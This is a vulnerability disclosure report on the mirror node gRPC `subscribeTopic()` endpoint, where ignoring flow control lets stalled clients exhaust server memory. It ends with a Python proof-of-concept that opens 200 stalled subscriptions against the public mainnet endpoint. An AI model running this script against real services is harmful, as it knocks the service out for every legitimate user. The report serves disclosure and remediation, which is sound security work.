### Title
Unbounded Netty Write-Buffer Growth via gRPC Flow-Control Stall in `subscribeTopic()`

### Summary
`ConsensusController.subscribeTopic()` wires the Reactor `Flux` to the gRPC `StreamObserver` using a plain `.subscribe(responseObserver::onNext, …)` call, which internally requests `Long.MAX_VALUE` items and never consults `ServerCallStreamObserver.isReady()`. Because `responseObserver.onNext()` is non-blocking in gRPC-Java/Netty (it serializes and enqueues into the Netty write buffer regardless of the HTTP/2 flow-control window), a client that deliberately stalls consumption causes the per-connection Netty write buffer to grow without bound. The `onBackpressureBuffer(maxBufferSize, ERROR)` guard in `SharedTopicListener` is structurally bypassed and provides no protection against this path.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` — `grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java`, lines 44–48:

```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```

`Flux.subscribe(Consumer)` issues an unbounded `request(Long.MAX_VALUE)` to the upstream. Every item produced by the pipeline is immediately handed to `responseObserver::onNext`.

**Why `onBackpressureBuffer(ERROR)` does not help:**

`SharedTopicListener.listen()` — `grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java`, line 24:

```java
.onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
.publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
```

This operator fires `ERROR` only when the *Reactor* downstream is slow — i.e., when the `publishOn` prefetch queue (default 48 slots) backs up. The consumer of that queue is the `boundedElastic` thread that calls `responseObserver.onNext()`. In gRPC-Java/Netty, `onNext()` serializes the protobuf message and calls `channel.write()`, which is **always non-blocking**: Netty enqueues the write into its `ChannelOutboundBuffer` and returns immediately, regardless of whether the HTTP/2 flow-control window is open. Therefore the `publishOn` queue never backs up, the `onBackpressureBuffer` never overflows, and the `ERROR` path is never triggered.

**Where the backlog actually accumulates:**

When the client uses HTTP/2 flow control to stall (e.g., `ClientCallStreamObserver.request(1)` with long delays), the server's HTTP/2 layer stops flushing DATA frames. The application layer continues calling `onNext()` → `channel.write()`, and Netty accumulates serialized frames in `ChannelOutboundBuffer`. Netty's `WriteBufferWaterMark` high-watermark (default 64 KB) sets `channel.isWritable() = false` above that threshold, but the code never checks `ServerCallStreamObserver.isReady()` (which maps to `channel.isWritable()`), so writes continue to be enqueued without limit.

**No total-subscriber cap:**

`GrpcConfiguration` sets `maxConcurrentCallsPerConnection = 5` (`NettyProperties`, default). This limits calls *per TCP connection*, not globally. An attacker opens N connections × 5 streams = 5N concurrent slow subscriptions. `subscriberCount` in `TopicMessageServiceImpl` is a Micrometer gauge only — it enforces nothing.

### Impact Explanation

Each stalled subscription accumulates serialized `ConsensusTopicResponse` protobuf frames in the Netty `ChannelOutboundBuffer` for that connection. With a high-volume topic and no limit on connections, an attacker running dozens of connections can force the JVM heap to absorb hundreds of megabytes of queued write data. This degrades or crashes the gRPC service for all legitimate subscribers (heap pressure → GC storms → OOM). The impact is service-wide, not scoped to the attacker's own stream.

### Likelihood Explanation

No authentication is required. Any internet-reachable mirror-node gRPC endpoint is exploitable with a standard gRPC client that calls `ClientCallStreamObserver.disableAutoRequestWithInitial(0)` and never calls `request()`. The attack is trivially scriptable, repeatable, and requires no special knowledge beyond the public protobuf API. The only practical friction is the per-connection call limit of 5, which is easily bypassed by opening more connections.

### Recommendation

1. **Integrate gRPC flow control**: After `.subscribe(…)`, register a `setOnReadyHandler` on the `ServerCallStreamObserver` and use a `Sinks.Many` or `FluxSink` with `LATEST`/`DROP` overflow strategy so the Reactor pipeline pauses when `isReady()` is false.
2. **Enforce a global subscriber cap**: Check `subscriberCount` against a configurable maximum before allowing a new subscription; return `RESOURCE_EXHAUSTED` if exceeded.
3. **Set a Netty write-buffer hard limit**: Configure `NettyServerBuilder.flowControlWindow()` and a tight `WriteBufferWaterMark` so that stalled connections are detected and closed by the transport layer.
4. **Add a per-subscription inactivity timeout**: Close subscriptions where no bytes have been acknowledged by the client within a configurable window (distinct from the existing message-emission timeout).

### Proof of Concept

```python
# Requires: grpcio, protobuf, hedera-mirror proto stubs
import grpc, threading, time
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mainnet-public.mirrornode.hedera.com:443"
TOPIC  = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=<active_topic>)

def slow_subscriber():
    # Open a channel and subscribe but never call request() after the first message
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub    = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query   = consensus_service_pb2.ConsensusTopicQuery(topicID=TOPIC)
    it      = stub.subscribeTopic(query)
    next(it)          # receive exactly 1 message
    time.sleep(3600)  # stall; server-side Netty buffer grows indefinitely

threads = [threading.Thread(target=slow_subscriber) for _ in range(200)]
# 200 connections × 1 stream each (or 40 connections × 5 streams each)
for t in threads:
    t.start()
# Monitor mirror-node JVM heap: observe continuous growth with no GC relief
```
